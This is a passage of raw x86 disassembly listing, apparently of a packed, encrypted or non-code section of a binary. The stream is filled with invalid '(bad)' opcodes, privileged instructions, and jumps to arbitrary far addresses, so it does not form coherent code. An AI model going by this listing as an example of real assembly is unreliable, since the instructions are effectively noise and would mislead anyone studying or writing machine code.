  4172bd:	adc    BYTE PTR [esi+0x3b],0x2c
  4172c1:	in     eax,dx
  4172c2:	stos   BYTE PTR es:[edi],al
  4172c3:	push   esp
  4172c4:	adc    BYTE PTR [ebx+0x6a],dl
  4172c7:	dec    esi
  4172c8:	arpl   WORD PTR [esi+0x46],bp
  4172cb:	and    BYTE PTR [edx-0x6b94e441],0x6c
  4172d2:	jno    0x4172c7
  4172d4:	daa    
  4172d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172d6:	retf   0xd8bb
  4172d9:	cli    
  4172da:	test   ecx,esi
  4172dc:	icebp  
  4172dd:	fwait
  4172de:	icebp  
  4172df:	aad    0x78
  4172e1:	or     DWORD PTR [ebp+0x32],0x3
  4172e5:	imul   ecx,esi,0xbb71e53e
  4172eb:	int    0x17
  4172ed:	ins    BYTE PTR es:[edi],dx
  4172ee:	jb     0x417334
  4172f0:	aas    
  4172f1:	icebp  
  4172f2:	inc    ecx
  4172f3:	mov    edx,0xf5c2b53f
  4172f8:	sbb    al,0xe4
  4172fb:	pusha  
  4172fc:	les    ebp,FWORD PTR [ebx-0x3b]
  4172ff:	adc    edx,DWORD PTR [ecx+0x4b]
  417302:	pop    eax
  417303:	adc    edi,DWORD PTR [ebx-0x62050922]
  417309:	xchg   BYTE PTR [esi+0x4f9deb1],ah
  41730f:	add    al,0x6d
  417311:	inc    BYTE PTR [ecx]
  417313:	(bad)  
  417315:	jmp    0x4651d308
  41731a:	std    
  41731b:	mov    cl,0x6d
  41731d:	dec    ebx
  41731e:	cli    
  41731f:	xchg   ecx,eax
  417320:	mov    edx,gs
  417322:	dec    edi
  417323:	sbb    dh,dh
  417325:	fisttp DWORD PTR [ebx]
  417327:	stc    
  417328:	cld    
  417329:	cmp    ah,BYTE PTR [eax+eax*2]
  41732c:	sub    ebx,eax
  41732e:	and    BYTE PTR [ebp-0x180b91bd],ch
  417334:	ins    DWORD PTR es:[edi],dx
  417335:	repnz icebp 
  417337:	sub    ebp,DWORD PTR [ebx-0x43986d24]
  41733d:	push   ss
  41733e:	jl     0x41732f
  417340:	xchg   ebx,eax
  417341:	lock adc BYTE PTR [edi+edx*1-0x3b],bh
  417346:	fidivr WORD PTR es:[edi-0x2]
  41734a:	dec    di
  41734c:	mov    ah,0x21
  41734e:	sub    BYTE PTR [esi-0x18],0xfd
  417352:	pushf  
  417353:	wrmsr  
  417355:	popa   
  417356:	ds xor eax,0xf99d2d47
  41735c:	inc    ecx
  41735d:	cmp    eax,DWORD PTR [edx-0x7ad7d290]
  417363:	jae    0x4172f3
  417365:	fld    TBYTE PTR [eax+edi*8-0x22]
  417369:	orps   xmm6,XMMWORD PTR [edi-0xa4619ce]
  417370:	inc    ebx
  417371:	push   0x11e49806
  417376:	dec    ebp
  417377:	add    esi,DWORD PTR [esi+0x26]
  41737a:	inc    ebx
  41737b:	imul   DWORD PTR [edx]
  41737d:	adc    edx,edx
  41737f:	gs jg  0x417310
  417382:	mov    WORD PTR [ebx],ds
  417384:	push   es
  417385:	(bad)  [edx]
  417387:	jmp    0x6168:0x2444f0b0
  41738e:	cmp    bh,cl
  417390:	ss mov ah,0xb1
  417393:	fdiv   st(0),st
  417395:	add    ebp,ebx
  417397:	xchg   esp,eax
  417398:	fcmovnu st,st(4)
  41739a:	mov    bh,0x3
  41739c:	repz push es
  41739e:	in     al,dx
  41739f:	lds    ebx,FWORD PTR [ebx-0x60]
  4173a2:	adc    al,0x3c
  4173a4:	sahf   
  4173a5:	fcom   QWORD PTR [ebx-0x6e347d72]
  4173ab:	inc    esp
  4173ac:	sub    dl,bl
  4173ae:	imul   esp,ebp,0x99bcb8ee
  4173b4:	scas   al,BYTE PTR es:[edi]
  4173b5:	icebp  
  4173b6:	xchg   esp,eax
  4173b7:	outs   dx,DWORD PTR ds:[esi]
  4173b8:	xchg   esi,eax
  4173b9:	in     al,0x3a
  4173bb:	fwait
  4173bc:	or     BYTE PTR [ecx],dl
  4173be:	mov    ecx,0xebb7bac1
  4173c3:	fmul   QWORD PTR [ecx]
  4173c5:	push   esi
  4173c6:	and    dh,0x9c
  4173c9:	adc    BYTE PTR [eax+0x14],ch
  4173cc:	xchg   edx,eax
  4173cd:	loop   0x4173d1
  4173cf:	inc    edx
  4173d0:	or     eax,0x87468486
  4173d5:	rcl    BYTE PTR [edi],1
  4173d7:	pushf  
  4173d8:	lds    eax,FWORD PTR [eax]
  4173da:	push   ds
  4173db:	pop    edi
  4173dc:	jecxz  0x41744f
  4173de:	xor    DWORD PTR [esp+ebx*2+0x5bde173c],esi
  4173e5:	loope  0x4173ef
  4173e7:	or     DWORD PTR [ebp-0x79],esp
  4173ea:	out    0xac,al
  4173ec:	xchg   esi,eax
  4173ed:	xor    esp,ebp
  4173ef:	adc    edx,edi
  4173f1:	js     0x4173f0
  4173f3:	data16 or BYTE PTR [edx],cl
  4173f6:	mov    edi,edi
  4173f8:	mov    eax,0x54d85
  4173fd:	pop    ds
  4173fe:	(bad)  
  4173ff:	sar    edi,cl
  417401:	and    DWORD PTR [ebp-0xe],ecx
  417404:	pop    esi
  417405:	dec    ebx
  417406:	mov    dl,0x46
  417408:	inc    ecx
  417409:	mov    eax,0x5a81d2a2
  41740e:	xlat   BYTE PTR ds:[ebx]
  41740f:	cmp    eax,0x69490274
  417414:	ins    BYTE PTR es:[edi],dx
  417415:	aaa    
  417416:	dec    esp
  417417:	inc    esp
  417418:	cmp    dl,BYTE PTR [edx+0x6d5e3011]
  41741e:	pop    eax
  41741f:	sti    
  417420:	adc    eax,0xaa759a5c
  417425:	fstp   QWORD PTR [edi-0x39]
  417428:	pusha  
  417429:	rcr    BYTE PTR [ecx-0x3ff20f07],cl
  41742f:	push   0x59
  417431:	mov    al,0x26
  417433:	out    dx,eax
  417434:	inc    edx
  417435:	nop
  417436:	jmp    DWORD PTR [eax]
  417438:	jmp    0xfb8549fc
  41743d:	dec    ecx
  41743e:	sbb    ch,0x14
  417441:	bound  edi,QWORD PTR [ebx]
  417443:	mov    edx,0xe6b0518f
  417448:	std    
  417449:	fsub   DWORD PTR [eax+eiz*8]
  41744c:	sbb    esi,DWORD PTR gs:[esi+0x13]
  417450:	jbe    0x417474
  417452:	gs and eax,0x4ba886be
  417458:	xor    dl,ch
  41745a:	retf   
  41745b:	push   es
  41745c:	and    al,0xa
  41745e:	dec    eax
  41745f:	push   es
  417460:	sub    BYTE PTR [edx+0xb],bh
  417463:	in     eax,0xd0
  417465:	sub    esi,eax
  417467:	inc    ebp
  417468:	adc    ebp,ebp
  41746a:	icebp  
  41746b:	retf   0xaf3f
  41746e:	sub    ecx,DWORD PTR [ecx+0x513cd83b]
  417474:	(bad)  
  417475:	leave  
  417476:	lock stos BYTE PTR es:[edi],al
  417478:	sahf   
  417479:	dec    edx
  41747a:	mov    bh,0xb4
  41747c:	retf   
  41747d:	call   0x35a3:0x413b6d1b
  417484:	ja     0x4174d5
  417486:	jmp    0x4002:0xd7e50eac
  41748d:	xor    BYTE PTR [ebx+eax*2],ch
  417490:	cmp    DWORD PTR [ebx],ebx
  417492:	loope  0x417433
  417494:	xchg   ecx,eax
  417495:	ins    DWORD PTR es:[edi],dx
  417496:	test   dh,0x9b
  417499:	sub    al,BYTE PTR [ecx-0x15bb1eab]
  41749f:	adc    BYTE PTR [esp+eax*1],0xb7
  4174a3:	cmp    bh,cl
  4174a5:	push   esp
  4174a6:	add    esi,ebx
  4174a8:	jmp    0x49ad8677
  4174ad:	add    al,0x1b
  4174af:	ss retf 
  4174b1:	xor    DWORD PTR [edx],esp
  4174b3:	push   ebx
  4174b4:	jmp    0x7b2f:0xcf66a13d
  4174bb:	xor    eax,DWORD PTR [edi-0x4ab2c0e7]
  4174c1:	dec    esi
  4174c2:	sbb    DWORD PTR [eax-0x44a3739b],esp
  4174c8:	ror    DWORD PTR [esi+eiz*4-0xd9303d5],cl
  4174cf:	and    ah,al
  4174d1:	mov    BYTE PTR [edi+0x74],al
  4174d4:	pushf  
  4174d5:	mov    eax,ds:0xac8f2b8f
  4174da:	fldenv [ebx+0x38]
  4174dd:	pop    esp
  4174de:	push   ss
  4174df:	xor    al,bh
  4174e1:	sbb    al,0x8e
  4174e3:	outs   dx,DWORD PTR ds:[esi]
  4174e4:	loop   0x417541
  4174e6:	(bad)  
  4174e7:	jmp    FWORD PTR [edx]
  4174e9:	cmp    dh,BYTE PTR [ebp+0x613bfb96]
  4174ef:	or     dl,BYTE PTR [edi-0x242de894]
  4174f5:	push   esi
  4174f6:	aad    0x43
  4174f8:	xchg   ebx,eax
  4174f9:	push   ebp
  4174fa:	dec    ebp
  4174fb:	lahf   
  4174fc:	(bad)  
  4174fe:	or     al,0x7a
  417500:	pmaddwd mm7,mm4
  417503:	pop    esi
  417504:	jg     0x41757b
  417506:	mov    esi,0x4e04be82
  41750b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41750c:	int    0x7c
  41750e:	jg     0x4174ad
  417510:	je     0x4174f7
  417512:	(bad)  
  417513:	sti    
  417514:	(bad)  
  417515:	imul   ecx,DWORD PTR [edx],0x3f
  417518:	pop    ebx
  417519:	retf   0xd2dd
  41751c:	push   esp
  41751d:	popf   
  41751e:	sbb    esi,DWORD PTR [eax]
  417520:	push   edi
  417521:	fdiv   st(1),st
  417523:	mov    dl,BYTE PTR [esi]
  417525:	clc    
  417526:	cmp    dh,BYTE PTR [edi+0x5e]
  417529:	or     BYTE PTR [ebx],dh
  41752b:	leave  
  41752c:	jns    0x417559
  41752e:	jae    0x417583
  417530:	cmp    ebp,esp
  417532:	(bad)  
  417533:	sbb    al,BYTE PTR [edi+0x3ba5466c]
  417539:	(bad)  
  41753a:	push   edi
  41753b:	(bad)  
  41753d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41753e:	jp     0x417590
  417540:	retf   
  417541:	push   ecx
  417542:	sub    esi,0xb84a7c6f
  417548:	jg     0x417503
  41754a:	scas   eax,DWORD PTR es:[edi]
  41754b:	or     DWORD PTR [ecx+eax*4],esi
  41754e:	add    BYTE PTR [eax+0x6b78e650],bh
  417554:	mov    dh,0x98
  417556:	jecxz  0x41756e
  417558:	retf   
  417559:	imul   ebp,DWORD PTR [ecx],0x62
  41755c:	outs   dx,DWORD PTR ds:[esi]
  41755d:	out    dx,eax
  41755e:	push   edi
  41755f:	sbb    al,0x2b
  417561:	into   
  417562:	push   esp
  417563:	mov    al,0x94
  417565:	jb     0x417594
  417567:	push   ebp
  417568:	jne    0x41757b
  41756a:	or     cl,bh
  41756c:	cld    
  41756d:	and    ecx,DWORD PTR [ebx+0x52]
  417570:	xlat   BYTE PTR ds:[ebx]
  417571:	mov    esi,0x24d56f19
  417576:	push   eax
  417577:	push   es
  417578:	xchg   BYTE PTR [edi],ah
  41757a:	pop    edx
  41757b:	and    DWORD PTR [ecx+0x71],edi
  41757e:	arpl   si,di
  417580:	push   es
  417581:	jmp    0x4175bd
  417583:	mov    DWORD PTR ds:[ebx],ebx
  417586:	xchg   ebx,eax
  417587:	ds sbb al,0x35
  41758a:	mov    esp,0x67cc89
  41758f:	in     al,0x35
  417591:	cmp    DWORD PTR [esi-0x2c1bca5b],eax
  417597:	mov    al,BYTE PTR ds:0x3e8ed4c3
  41759d:	dec    edi
  41759e:	ins    DWORD PTR es:[edi],dx
  41759f:	sahf   
  4175a0:	pop    ebp
  4175a1:	jbe    0x4175ce
  4175a3:	pusha  
  4175a4:	pop    edx
  4175a5:	inc    eax
  4175a6:	pusha  
  4175a7:	jl     0x4175f9
  4175a9:	in     al,0x8
  4175ab:	out    dx,al
  4175ac:	xchg   ebp,ecx
  4175ae:	mov    DWORD PTR [ecx],esi
  4175b0:	imul   edi,DWORD PTR [ebx+0x5cca5cfa],0x40
  4175b7:	repz mov bl,0x97
  4175ba:	jns    0x41761d
  4175bc:	fucomip st,st(7)
  4175be:	adc    eax,0x1effc6da
  4175c3:	aam    0xf1
  4175c5:	in     eax,dx
  4175c6:	fisub  DWORD PTR [ebp+0x15f8c0b7]
  4175cc:	jmp    0xcf638318
  4175d1:	mov    BYTE PTR [edi],dh
  4175d3:	push   0xffffff9e
  4175d5:	inc    ecx
  4175d6:	(bad)  
  4175d7:	rol    DWORD PTR [eax],cl
  4175d9:	or     esp,DWORD PTR [ebp-0x3c]
  4175dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175de:	aad    0xa0
  4175e0:	push   es
  4175e1:	retf   0x3f06
  4175e4:	cmc    
  4175e5:	(bad)  
  4175e6:	fdivr  QWORD PTR ds:0xf9727ddc
  4175ec:	shr    bl,1
  4175ee:	adc    ch,BYTE PTR [edx+0x7d]
  4175f1:	add    eax,0xe5bcb9a7
  4175f6:	dec    DWORD PTR [eax+ecx*2-0x573d52c4]
  4175fd:	sbb    al,0x1b
  4175ff:	push   cs
  417600:	jno    0x417661
  417602:	into   
  417603:	shl    BYTE PTR [edx-0x3],cl
  417606:	fstp   QWORD PTR [eax]
  417608:	fisub  DWORD PTR [ebx+0x1d]
  41760b:	dec    edx
  41760c:	fdivr  DWORD PTR [edx-0x34]
  41760f:	lock adc ecx,DWORD PTR ds:0xf8aede4e
  417616:	ins    BYTE PTR es:[edi],dx
  417617:	fiadd  DWORD PTR [ebp+0x3f2cb42a]
  41761d:	data16 mov bl,0x2
  417620:	or     eax,0x36d48f8f
  417625:	cli    
  417626:	cs jnp 0x417698
  417629:	gs pop edi
  41762b:	int3   
  41762c:	adc    dl,0x38
  41762f:	lock xor bh,BYTE PTR [ecx+0x4196f601]
  417636:	pop    ebx
  417637:	mov    ecx,0xab8c4808
  41763c:	mov    eax,0xcbac8fb2
  417641:	pop    ebx
  417642:	cld    
  417643:	jge    0x4176a7
  417645:	or     BYTE PTR [eax+0x22ac3144],0x3c
  41764c:	pop    ecx
  41764d:	test   al,0x49
  41764f:	sbb    eax,0x7afe37d7
  417654:	adc    dh,BYTE PTR [eax-0x2e]
  417657:	or     DWORD PTR [ecx],esp
  417659:	fisubr WORD PTR [ebp+0xb96283d]
  41765f:	ror    DWORD PTR [edx+0x4d],cl
  417662:	ss or  al,0xa0
  417665:	dec    ecx
  417666:	adc    ebp,DWORD PTR [edi-0x29e8dc69]
  41766c:	pop    ss
  41766d:	jmp    FWORD PTR [edi]
  41766f:	pushf  
  417670:	xchg   BYTE PTR [eax+0x513d99e],ch
  417676:	cmp    DWORD PTR [ecx+0x5206ae79],0x92f2cf39
  417680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417681:	sbb    dh,ch
  417683:	push   ebp
  417684:	xchg   edi,eax
  417685:	dec    esp
  417686:	ror    DWORD PTR [ecx+0x9],1
  417689:	das    
  41768a:	mul    ch
  41768c:	out    dx,eax
  41768d:	pop    esp
  41768e:	and    DWORD PTR [ebp+0x336e13bc],ebx
  417694:	inc    edx
  417695:	lahf   
  417696:	idiv   DWORD PTR ss:[esi-0x4bf6e9f7]
  41769d:	cmp    al,0xcc
  41769f:	lea    ebx,[edx-0x383994aa]
  4176a5:	scas   eax,DWORD PTR es:[edi]
  4176a6:	mov    dl,0xbf
  4176a8:	cli    
  4176a9:	inc    ecx
  4176aa:	cmp    eax,0xa0a81778
  4176af:	add    al,0xa8
  4176b1:	into   
  4176b2:	mov    al,0x59
  4176b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176b5:	xor    dh,BYTE PTR [eax+0x46]
  4176b8:	cmp    al,0x4c
  4176ba:	arpl   WORD PTR [eax+eax*8-0x275b3fea],ax
  4176c1:	arpl   WORD PTR [edi],ax
  4176c3:	ret    0xa62
  4176c6:	arpl   WORD PTR [esi],dx
  4176c8:	pop    ecx
  4176c9:	clc    
  4176ca:	dec    esp
  4176cb:	xchg   esp,eax
  4176cc:	and    ebx,ecx
  4176ce:	jmp    0x4cf6:0x60044048
  4176d5:	pop    edi
  4176d6:	in     eax,dx
  4176d7:	cmp    BYTE PTR [ecx-0x68514dfc],al
  4176dd:	push   ecx
  4176de:	shr    DWORD PTR [esi+0x9d254d],cl
  4176e4:	push   ebp
  4176e5:	mov    fs,WORD PTR [eax+0x35377aa]
  4176eb:	fcmovbe st,st(7)
  4176ed:	add    eax,0x91cb700a
  4176f2:	loop   0x417757
  4176f4:	shl    DWORD PTR gs:[esi-0x414d8513],1
  4176fb:	inc    ebx
  4176fc:	stos   BYTE PTR es:[edi],al
  4176fd:	jmp    0x738b6e66
  417702:	fcmovu st,st(3)
  417704:	pop    esp
  417705:	(bad)  
  417706:	mov    esp,0xee6b0132
  41770b:	dec    esi
  41770c:	das    
  41770d:	and    eax,DWORD PTR [ebx+0x1951dc41]
  417713:	(bad)  
  417714:	lock or edx,DWORD PTR [ebx-0x38]
  417718:	xchg   BYTE PTR [ebp+0x55a7f914],dl
  41771e:	jecxz  0x41773e
  417720:	int    0x99
  417722:	mov    ds,WORD PTR [esi]
  417724:	mov    dl,0xa7
  417726:	and    al,0xfe
  417728:	cli    
  417729:	imul   esi,DWORD PTR [eax],0xfffffff8
  41772c:	imul   edi,DWORD PTR [ebp+0x4e],0x246b02ce
  417733:	sub    BYTE PTR [esi],dl
  417735:	fs stc 
  417737:	sbb    BYTE PTR [esi-0x18],cl
  41773a:	jns    0x417792
  41773c:	xchg   esi,eax
  41773d:	aaa    
  41773e:	es int3 
  417740:	mov    ebx,0xd3bef5
  417745:	(bad)  
  417746:	or     edi,DWORD PTR [ebp+0x30]
  417749:	xor    eax,0xb8e6c951
  41774e:	loopne 0x417715
  417750:	jns    0x41777c
  417752:	popf   
  417753:	or     ch,dh
  417755:	pop    ss
  417756:	push   ebp
  417757:	bound  esi,QWORD PTR [edi]
  417759:	lea    esi,[bx+di+0x38]
  41775d:	dec    edi
  41775e:	xor    BYTE PTR [ebx-0x3],ah
  417761:	jne    0x4177ba
  417763:	neg    esi
  417765:	repz push esi
  417767:	fnstsw WORD PTR [eax+edi*2+0x4b]
  41776b:	or     DWORD PTR [edi-0x25184458],ebp
  417771:	adc    eax,0x5eea2347
  417776:	shl    DWORD PTR [edi-0x71a6dbed],0x53
  41777d:	sti    
  41777e:	test   DWORD PTR [ebp-0x39],ecx
  417781:	dec    edx
  417782:	(bad)  
  417783:	push   esi
  417784:	jg     0x4177fa
  417786:	cmc    
  417787:	stos   BYTE PTR es:[edi],al
  417788:	daa    
  417789:	add    BYTE PTR [edi+eiz*4],dl
  41778c:	mov    ebp,0xe242c1e2
  417791:	push   edi
  417792:	cmp    ecx,DWORD PTR [ecx+eax*2]
  417795:	push   esi
  417796:	outs   dx,DWORD PTR ds:[esi]
  417797:	jecxz  0x417786
  417799:	pop    edx
  41779a:	mov    ebp,0xa73e8bf4
  41779f:	jecxz  0x41775b
  4177a1:	inc    ebp
  4177a2:	xchg   ebx,eax
  4177a3:	mov    WORD PTR [edx+0x30],ss
  4177a6:	mov    dh,0x49
  4177a8:	bnd jp 0x41773e
  4177ab:	xrelease mov DWORD PTR [edx+0x15],ecx
  4177af:	push   eax
  4177b0:	cld    
  4177b1:	retf   0xbe1c
  4177b4:	mov    edx,0xfffff780
  4177b9:	ins    DWORD PTR es:[edi],dx
  4177ba:	stos   DWORD PTR es:[edi],eax
  4177bb:	imul   esi,DWORD PTR [edx-0x29],0xffffffbd
  4177bf:	and    BYTE PTR [eax],dh
  4177c1:	mov    eax,0xf497c95
  4177c6:	jbe    0x417821
  4177c8:	and    ebx,ebp
  4177ca:	out    dx,eax
  4177cb:	jb     0x4177d1
  4177cd:	sub    eax,0x8c95b552
  4177d2:	(bad)  
  4177d3:	lods   eax,DWORD PTR ds:[esi]
  4177d4:	or     al,0x49
  4177d6:	push   ecx
  4177d7:	sbb    al,0xdf
  4177d9:	add    BYTE PTR [ebp+0x9],bh
  4177dc:	adc    DWORD PTR [edi-0x50],ebp
  4177df:	push   ss
  4177e0:	test   eax,0xcc21f219
  4177e5:	pop    ds
  4177e6:	pop    edx
  4177e7:	fcom   st(6)
  4177e9:	jb     0x4177a1
  4177eb:	mov    eax,ds:0x2c68e996
  4177f0:	jb     0x417774
  4177f2:	add    bh,BYTE PTR [edi+eiz*4]
  4177f5:	loopne 0x41778f
  4177f7:	mov    edi,DWORD PTR [edi]
  4177f9:	idiv   esi
  4177fb:	inc    esi
  4177fc:	push   esp
  4177fd:	(bad)  
  4177fe:	xor    edx,DWORD PTR [edi-0x76]
  417801:	adc    al,0xa
  417803:	push   esi
  417804:	cmc    
  417805:	je     0x41781e
  417807:	jb     0x4177f8
  417809:	push   ebx
  41780a:	mov    dl,0x2f
  41780c:	inc    ebx
  41780d:	test   al,0xf4
  41780f:	popf   
  417810:	mov    dl,0xc
  417812:	addr16 mov esi,0x1478aed1
  417818:	push   edi
  417819:	dec    ebx
  41781a:	push   esi
  41781b:	imul   DWORD PTR [eax+0x66]
  41781e:	out    0x1c,eax
  417820:	retf   0xf003
  417823:	ds popa 
  417825:	or     DWORD PTR [esi],0xffffffeb
  417828:	lahf   
  417829:	test   BYTE PTR [ebx+0x3e70f8d2],0x4
  417830:	sub    BYTE PTR [ecx+0x516b8356],ch
  417836:	test   DWORD PTR [edi+ebp*1],0x9429ed33
  41783d:	mov    DWORD PTR [edx-0x19],edx
  417840:	cmp    BYTE PTR gs:[esi-0x66],al
  417844:	jmp    0x2e86:0xca634a9a
  41784b:	fisubr DWORD PTR [eax-0x259ca120]
  417851:	push   0x8b21b77d
  417856:	and    DWORD PTR [eax+0x72d61080],eax
  41785c:	in     eax,dx
  41785d:	clc    
  41785e:	mov    BYTE PTR [ecx-0x50],0x4e
  417862:	adc    dh,0x51
  417865:	lds    esp,FWORD PTR [ecx+ebp*1]
  417868:	sub    DWORD PTR [esi+0x62],eax
  41786b:	cmp    edi,DWORD PTR [edx-0x4b]
  41786e:	cmp    BYTE PTR [edx],dh
  417870:	push   edx
  417871:	adc    bh,cl
  417873:	in     eax,0xcd
  417875:	jp     0x4178ad
  417877:	jne    0x41789b
  417879:	fcomp  st(6)
  41787b:	cld    
  41787c:	mov    bh,0xc1
  41787e:	stc    
  41787f:	push   edx
  417880:	adc    al,0xc5
  417882:	sub    al,0x10
  417884:	xchg   edx,eax
  417885:	ds shr esp,cl
  417888:	sbb    BYTE PTR es:[edi-0x58],dh
  41788c:	push   cs
  41788d:	mov    BYTE PTR [ebx],bl
  41788f:	scas   al,BYTE PTR es:[edi]
  417890:	jo     0x417902
  417892:	or     eax,0x4563fe6e
  417897:	xor    dh,BYTE PTR [ebx-0x6a]
  41789a:	push   0x7ade1a35
  41789f:	sub    dl,BYTE PTR ss:[edx]
  4178a2:	iret   
  4178a3:	out    dx,al
  4178a4:	aas    
  4178a5:	dec    eax
  4178a6:	jb     0x4178f8
  4178a8:	sbb    al,bl
  4178aa:	mov    ebp,0x6787bf85
  4178af:	icebp  
  4178b0:	inc    ecx
  4178b1:	lahf   
  4178b2:	push   ds
  4178b3:	xor    BYTE PTR [edi-0x6b880b28],dl
  4178b9:	inc    edi
  4178ba:	jo     0x417895
  4178bc:	xchg   esi,eax
  4178bd:	jge    0x41783f
  4178bf:	pop    ebp
  4178c0:	xor    al,0x8b
  4178c2:	and    eax,0xdf2aa0a7
  4178c7:	add    eax,0x99b3e9f5
  4178cc:	mov    eax,ds:0xfcb1bf9e
  4178d1:	scas   eax,DWORD PTR es:[edi]
  4178d2:	mov    edx,0xa0d8a4b1
  4178d7:	mov    DWORD PTR [esi+0x37],ecx
  4178da:	push   edx
  4178db:	jle    0x417914
  4178dd:	dec    ebp
  4178de:	lods   eax,DWORD PTR ds:[esi]
  4178df:	cmp    bh,BYTE PTR [eax+0x76486fa4]
  4178e5:	gs xchg esi,eax
  4178e7:	mov    esp,0x8ae71886
  4178ec:	mov    ebp,0x1b319cbc
  4178f1:	lods   eax,DWORD PTR ds:[esi]
  4178f2:	pushf  
  4178f3:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4178f5:	add    bh,ah
  4178f7:	mov    BYTE PTR [esi],bl
  4178f9:	sbb    eax,0xda3bb8f4
  4178fe:	inc    ebx
  4178ff:	sti    
  417900:	mov    al,0x1f
  417902:	fcmovnu st,st(6)
  417904:	lahf   
  417905:	jmp    0x442e1d93
  41790a:	inc    eax
  41790b:	pop    ebp
  41790c:	out    0xb2,al
  41790e:	inc    ecx
  41790f:	das    
  417910:	inc    edx
  417911:	mov    eax,ds:0x11d46a4a
  417916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417917:	sbb    DWORD PTR [ebp+0x1f],ebx
  41791a:	sbb    eax,0x96b07244
  41791f:	jmp    0x4178f6
  417921:	inc    esi
  417922:	ror    DWORD PTR [esi+0x41],0x20
  417926:	test   DWORD PTR [esi+edi*2],ebp
  417929:	aas    
  41792a:	ja     0x417956
  41792c:	adc    ah,dl
  41792e:	push   edx
  41792f:	sar    BYTE PTR [ecx+0x2c],0xff
  417933:	jae    0x41790c
  417935:	push   ss
  417936:	xor    al,0x26
  417938:	or     esp,edx
  41793a:	pop    ebp
  41793b:	inc    esi
  41793c:	jae    0x417982
  41793e:	mov    esp,0x9dd856f5
  417943:	mov    ch,0xcc
  417945:	pop    ss
  417946:	stos   BYTE PTR es:[edi],al
  417947:	and    dl,bh
  417949:	and    ecx,ebp
  41794b:	sbb    eax,0xa0a4b58f
  417950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417951:	les    esi,FWORD PTR [edx]
  417953:	daa    
  417954:	call   0xcebc:0xc53b7805
  41795b:	into   
  41795c:	add    DWORD PTR [edx+0x7f],0x87a3320f
  417963:	jg     0x41790d
  417965:	loope  0x41793c
  417967:	pop    es
  417968:	mov    ebx,0x9426bf8a
  41796d:	mov    ds:0xca7e1ff9,eax
  417972:	xor    DWORD PTR [ebx],ebx
  417974:	std    
  417975:	rol    cl,0x9b
  417978:	jmp    0x9477:0x3acd155f
  41797f:	dec    BYTE PTR [edi+0x209296cc]
  417985:	lds    edi,FWORD PTR [ebx-0x254ba481]
  41798b:	stc    
  41798c:	imul   ebp,eax,0xffffffdc
  41798f:	nop
  417990:	bound  ecx,QWORD PTR [ebx+esi*8-0x72]
  417994:	mov    ds:0x8768ed2e,al
  417999:	addr16 inc ecx
  41799b:	ret    
  41799c:	repnz shr DWORD PTR [eax],1
  41799f:	fs pusha 
  4179a1:	sbb    eax,0x986fb2c4
  4179a6:	out    dx,eax
  4179a7:	push   0xffffffe4
  4179a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179aa:	pop    esp
  4179ab:	and    ebp,DWORD PTR [ebp-0x4d]
  4179ae:	inc    ebx
  4179af:	cmp    BYTE PTR ds:0x1c5a54cf,ah
  4179b5:	mov    esi,0x1276fc60
  4179ba:	shl    esp,cl
  4179bc:	inc    ecx
  4179bd:	aad    0x59
  4179bf:	cmp    eax,0xec424213
  4179c4:	frstor [edx-0x4b06702b]
  4179ca:	loope  0x4179c9
  4179cc:	dec    ebx
  4179cd:	sub    eax,0x59f5270b
  4179d2:	cmp    DWORD PTR [eax],esp
  4179d4:	popf   
  4179d5:	cs add eax,0x53dcd7f1
  4179db:	xchg   edx,eax
  4179dc:	clc    
  4179dd:	mov    cl,0x80
  4179df:	mov    ch,0x55
  4179e1:	ret    
  4179e2:	or     BYTE PTR [edi],ah
  4179e4:	or     eax,0x416c15e7
  4179e9:	xchg   ebp,eax
  4179ea:	test   eax,0xd036225e
  4179ef:	xor    DWORD PTR [eax+esi*4],ebp
  4179f2:	mov    esi,DWORD PTR [eax+0x76]
  4179f5:	call   0x2795:0xbf9426de
  4179fc:	jb     0x4179f7
  4179fe:	mov    al,ds:0xd6544ba
  417a03:	in     al,dx
  417a04:	adc    al,0x78
  417a06:	int3   
  417a07:	mov    dl,0xab
  417a09:	push   esi
  417a0a:	push   edx
  417a0b:	mov    esp,0x9478083a
  417a10:	fwait
  417a11:	jg     0x417a01
  417a13:	jae    0x4179c3
  417a15:	mov    cl,BYTE PTR [ecx-0x5c43b7f0]
  417a1b:	mov    ah,0xea
  417a1d:	and    BYTE PTR [edi+eax*2+0x40],bh
  417a21:	enter  0xeded,0x1e
  417a25:	loope  0x417a89
  417a27:	(bad)  
  417a28:	cmp    al,0x63
  417a2a:	mov    edx,0xe1e924ec
  417a2f:	jae    0x417a92
  417a31:	and    eax,0xf09109ca
  417a36:	mov    dl,0xb9
  417a38:	test   bl,0xe4
  417a3b:	je     0x417a6f
  417a3d:	and    ecx,ebp
  417a3f:	cmp    bl,BYTE PTR [edi]
  417a41:	shl    BYTE PTR ds:0x2d5d82eb,0x26
  417a48:	mov    bh,0x97
  417a4a:	or     BYTE PTR [edi+0x9285880],al
  417a50:	div    DWORD PTR [ebx-0x59]
  417a53:	test   BYTE PTR [edi],0xeb
  417a56:	rol    ebx,cl
  417a58:	shr    ecx,1
  417a5a:	stos   DWORD PTR es:[edi],eax
  417a5b:	and    esi,DWORD PTR [esi]
  417a5d:	cmp    edx,DWORD PTR [ebp+0x31]
  417a60:	adc    edx,DWORD PTR [esi-0x204ff1f4]
  417a66:	loop   0x417a19
  417a68:	mov    ch,0x3d
  417a6a:	scas   al,BYTE PTR es:[edi]
  417a6b:	push   0x84760256
  417a70:	jg     0x417a6b
  417a72:	push   0x926bc65c
  417a77:	sub    eax,0xa896760
  417a7c:	jg     0x417afb
  417a7e:	fild   QWORD PTR [edi-0x3b5acbdd]
  417a84:	cmp    al,0xc3
  417a86:	xchg   esp,eax
  417a87:	mov    dh,0xdf
  417a89:	jae    0x417a2d
  417a8b:	and    edx,eax
  417a8d:	test   al,0xa1
  417a8f:	jge    0x417ab5
  417a91:	cmp    BYTE PTR [bx],dh
  417a94:	inc    edi
  417a95:	pusha  
